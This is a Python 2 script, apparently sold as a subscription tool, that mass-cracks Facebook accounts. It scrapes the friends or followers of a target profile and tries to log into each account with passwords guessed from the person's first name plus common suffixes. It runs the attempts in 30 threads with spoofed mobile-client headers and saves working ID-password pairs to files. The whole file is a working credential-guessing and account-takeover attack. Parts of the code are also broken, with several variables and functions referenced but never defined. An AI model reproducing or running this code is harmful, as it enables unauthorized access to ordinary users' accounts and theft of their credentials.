#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written (IMTIAZ ALI ARADIN)
import os, time, uuid, requests
try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

agents = [
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
]
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = """
\033[1;92m     ♡♡  ╔══╗╔═╗╔═╗╔════╗╔══╗╔═══╗╔════╗  ♡♡
\033[1;92m     ♡♡  ╚╣─╝║║╚╝║║║╔╗╔╗║╚╣─╝║╔═╗║╚══╗═║  ♡♡
\033[1;93m     ♡♡  ─║║─║╔╗╔╗║╚╝║║╚╝─║║─║║─║║──╔╝╔╝  ♡♡
\033[1;93m     ♡♡  ─║║─║║║║║║──║║───║║─║╚═╝║─╔╝╔╝─  ♡♡
\033[1;92m     ♡♡  ╔╣─╗║║║║║║──║║──╔╣─╗║╔═╗║╔╝═╚═╗  ♡♡
\033[1;92m     ♡♡  ╚══╝╚╝╚╝╚╝──╚╝──╚══╝╚╝─╚╝╚════╝  ♡♡
\033[1;91m-----------------------------------------------------
 \033[1;91m(*)\033[1;95m Developer: ◠◡♥♥  ARADIN KINH  ♥♥◡◠
 \033[1;92m(*)\033[1;94m Facebook : ◠◡♥♥ IMTIAZ ARADIN ♥♥◡◠
 \033[1;93m(*)\033[1;93m Github   : ◠◡♥♥  A KING 110   ♥♥◡◠
 \033[1;97m(*)\033[1;96m Helper   : ◠◡♥♥ Nisar Somroo  ♥♥◠◡
 \033[1;94m(*)\033[1;92m
 \033[1;95m(*)\033[1;91m  ✯ 🅐︎🅡︎🅐︎🅓︎🅘︎🅝︎ Ⓚ︎Ⓘ︎Ⓝ︎Ⓖ︎ 🅑︎🅞︎🅛︎🅣︎🅔︎ Ⓟ︎Ⓤ︎Ⓑ︎Ⓛ︎Ⓘ︎Ⓒ︎ ✯
\033[1;91m-----------------------------------------------------
"""
def main_apv():
    imt=" -imtaiz"
    os.system('clear')
    print logo
    try:
        key1=open("/sdcard/imt.txt",'r').read()
    except IOError:
        os.system("clear")
        print logo
        print ("You dont have subscrption")
        print ("Hello Dear Ya Cammonds Paid Han Or Ap Ke Subscription Nhi Ha Please Ap Admin Sa Rabta Kran Thanks")
        print (" Subscription Kelya Enter Press Kro Or Whatsapp Pa Rabta Kro Thanks")
        myid=uuid.uuid4().hex[:8]
        print ("Your key : "+MYID+IMT)
        print ("jo mrzi likh lena")
        kok=open("/sdcard/imt.txt",'w')
        kok.write(MYID+IMT)
        kok.close()
        raw_input("press enter go to admin")
        os.system("xdg-open https://wa.me/+923237528063")

    r1=requests.get("https://raw.githubusercontent.com/AKING110/new/main/imt.txt").text
    if key1 in r1:
        tool()
    else:
        os.system("clear")
        print logo
        print ("You dont have subscrption")
        print ("Hello Dear Ya Cammonds Paid Han Or Ap Ke Subscription Nhi Ha Please Ap Admin Sa Rabta Kran Thanks")
        print (" Subscription Kelya Enter Press Kro Or Whatsapp Pa Rabta Kro Thanks")
        print ("Your key : "+key1)
        print ("jo mrzi likh lena")
        raw_input("Agar Ap Na Subscription Kar Le Ha To Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio Thanks")
        os.system("xdg-open https://wa.me/+923237528063")


def tool():
	os.system("clear")
	print("")
	print(logo)
	time.sleep(0.5)
	print("First Put Tool Username  IMTIAZ").center(50)
	print("")
	time.sleep(0.5)
	username = raw_input("[!] Tool Username : ")
	if username =="IMTIAZ":
		print("")
		time.sleep(0.5)
		print("\033[1;92mTool Username is correct").center(50)
		print("")
		time.sleep(0.5)
		step_main()
	else:
		print("")
		time.sleep(0.5)
		print("\033[1;91mTool Username Is Invalid :) ").center(50)
                os.system('xdg-open https://www.facebook.com/babar.tunio.71')
		print("")
		time.sleep(0.5)
		tool()
def step_main():
	os.system("clear")
	print(logo)
	print("")
	time.sleep(0.5)
	print("First Put Tool Password ARADIN").center(50)
	print("")
	time.sleep(0.5)
	username = raw_input("[!] Tool Password : ")
	if username =="ARADIN":
		print("")
		time.sleep(0.5)
		print("\033[1;92mTool Password is correct").center(50)
		print("")
		time.sleep(0.5)
		main()
	else:
		print("")
		time.sleep(0.5)
		print("\033[1;91mTool Password Is Invalid :) ").center(50)
                os.system('xdg-open https://www.facebook.com/babar.tunio.71')
		print("")
		time.sleep(0.5)
		step_main()

def main():
	os.system("clear")
	print(logo)
	print("")
	print("\x1b[1;93m\t(Choose Method)")
	print("")
	print("\x1b[1;93m[1]\x1b[1;92m  START CRACKING \x1b[1;93m[VIP]\n")
        print("\x1b[1;93m[2]\x1b[1;92m MY WHATSAPP NO \x1b[1;98m03237528063\n")
	print("")
	os.system('xdg-open https://www.facebook.com/babar.tunio.71')
	log_sel()
def log_sel():
	select = raw_input("\033[1;92mChoose option: \033[0;93m")
	if select =="1":
		login()

	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def login():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
		print("")
		print(" \x1b[1;92m  \t(LOGIN)")
		print("")
		print(47*"-")
		print("\x1b[1;92m[1]\x1b[1;93m LOGIN WITH TOKEN")
		print("\x1b[1;92m[2]\x1b[1;93m Back ")
                print("\x1b[1;92m[3]\x1b[1;93m FOR TOKEN CONTACT 03237528063")
		print(47*"\x1b[1;92m-")
		print("")
		log_select()
def log_select():
	sel = raw_input("\x1b[1;92m Choose option: ")
	if sel =="1":
		token()
	elif sel =="2":
		run()

	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)

        token = raw_input        ("\x1b[1;93m Paste token :\x1b[1;92m ")
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(0.5)
        login()
    os.system("clear")
    print(logo)
    print("")
    print("\x1b[1;92m            WELLCOME : "+name)
    print("")
    print(47*"-")
    print("")
    print("\x1b[1;92m[1]\x1b[1;93m Crack with Auto pass\n")
    print("\x1b[1;92m[2]\x1b[1;93m Crack with Choice pass\n")
    print("\x1b[1;92m[3]\x1b[1;93m Back ")
    print(47*"\x1b[1;92m-")
    print("")
    menu_option()
def menu_option():
	select = raw_input("\033[1;92mChoose option: \033[0;93m")
	if select =="1":
		crack()
	elif select =="2":
		choice()

	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(0.5)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mAUTO PASS CRACK\033[0;97m")
	print("")
	print(47*"\x1b[1;92m-")
	print("\x1b[1;92m[1]\x1b[1;93m Crack Public Id")
	print("\x1b[1;92m[2]\x1b[1;93m Crack Followers Id")
	print("\x1b[1;92m[0]\x1b[1;93m Back")
	print(47*"\x1b[1;92m-")
	print("")
	crack_select()
def crack_select():
	select = raw_input("\033[1;33mChoose option: \033[0;92m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)

		idt = raw_input("\x1b[1;93m Input id:\x1b[1;92m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print(" START CRACKING")
			print('')
			print("  Cloning from :\x1b[1;92m "+q["name"])
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)

		idt = raw_input("\x1b[1;93m Input id:\x1b[1;92m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("  START CRACKING ")
			print('')
			print("  Cloning from:\x1b[1;92m "+q["name"])
		except KeyError:
			print("\tInvalid id link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		crack_select()
	print("\x1b[1;93m  Total IDs :\x1b[1;92m "+str(len(id)))
	print("\x1b[1;93m  The Process has been started ")
	print("\x1b[1;93m  Plzz wait to Crack idzz")
	print("\x1b[1;93m  Press ctrl + z to stop")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower()+"123"
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("IMTIAZok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("IMTIAZcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower()+"12"
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("IMTIAZok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("IMTIAZcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+"12345"
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("IMTIAZok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("IMTIAZcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+"786"
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("IMTIAZok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("IMTIAZcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower()+"1122"
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("IMTIAZok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("IMTIAZcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower()+"110"
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("IMTIAZok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("IMTIAZcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower()+"786"
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("IMTIAZok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("IMTIAZcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	print(47*"\x1b[1;92m-")
	print("   \x1b[1;92mTHE PROCESS HAS BEEN COMPLETED")
	print("   \x1b[1;92m TOTAL OK/CP: "+str(len(oks))+"/"+str(len(cps)))
	print(47*"-")
	print("")
	print("")
	raw_input(" \x1b[1;93m PRESS ENTER TO BACK ")
	menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mCHOICE PASS CRACK\033[0;97m")
	print("")
	print(47*"\x1b[1;93m-")
	print("\x1b[1;93m[1]\x1b[1;92m Crack Public id")
	print("\x1b[1;93m[2]\x1b[1;92m Crack Followers id")
	print("\x1b[1;93m[0]\x1b[1;93m Back")
	print(47*"-")
	print("")
	choice_select()
def choice_select():
	select = raw_input("\033[1;33mChoose option: \033[0;92m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mCHOICE PASS PUBLIC CRACKING\033[0;97m")
		print("")
		pass1 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass2 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass3 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass4 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass5 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		idt = raw_input("\x1b[1;92m Input id:\x1b[1;93m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print(" Cloning from :\x1b[1;92m "+q["name"])
		except KeyError:
			print("\t    \033[1;31mLogged in id has checkpoint\033[0;97m")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\t    \033[1;32mCHOICE PASS FOLLOWERS CRACKING \033[0;97m")
		print("")
		pass1 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass2 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass3 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass4 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		pass5 = raw_input("\x1b[1;93m Password:\x1b[1;92m ")
		idt = raw_input("\x1b[1;92m Input id:\x1b[1;93m ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print(" Cloning from:\x1b[1;92m "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option\033[0;97m")
		print("")
		choice_select()
	print("\x1b[1;93m  TOTAL IDS :\x1b[1;92m "+str(len(id)))
	print("\x1b[1;93m  THE PROCESS HAS BEEN STARTED ")
	print("\033[1;93m  WAIT TO CRACK IDZ")
	print("\x1b[1;93m  PRESS CTRL + Z TO STOP")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("IMTIAZok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("IMTIAZcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("IMTIAZok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("IMTIAZcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("IMTIAZok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("IMTIAZcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("IMTIAZok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("IMTIAZcp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("IMTIAZok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("IMTIAZcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("IMTIAZok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [IMTIAZ-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("IMTIAZcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [IMTIAZ-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("IMTIAZok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [IMTIAZ-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("IMTIAZcp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	print(47*"\x1b[1;92m-")
	print(" \x1b[1;92m  THE PROCESS HAS BEEN COMPLETED")
	print(" \x1b[1;92m   TOTAL OK/CP: "+str(len(oks))+"/"+str(len(cps)))
	print(47*"-")
	print("FOR AGAIN RUN TYPE python2 Imtiaz.vip")
	print("")
	raw_input(" \x1b[1;93m PRESS ENTER TO BACK ")
	main()


if __name__ == '__main__':
	main_apv()
